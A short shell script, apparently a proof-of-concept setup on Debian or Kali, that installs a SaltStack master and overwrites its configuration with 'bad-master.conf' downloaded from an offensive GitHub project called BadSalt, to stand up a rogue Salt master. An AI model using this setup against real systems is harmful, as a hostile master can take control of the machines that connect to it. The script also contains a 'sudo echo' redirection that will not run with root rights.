# Debian/Kali PoC
wget -O - https://repo.saltstack.com/apt/debian/9/amd64/latest/SALTSTACK-GPG-KEY.pub | sudo apt-key add -
sudo echo "deb http://repo.saltstack.com/apt/debian/9/amd64/latest stretch main" > /etc/apt/sources.list.d/saltstack.list
sudo apt update
sudo apt install salt-master
wget -O - https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-master.conf > /etc/salt/master
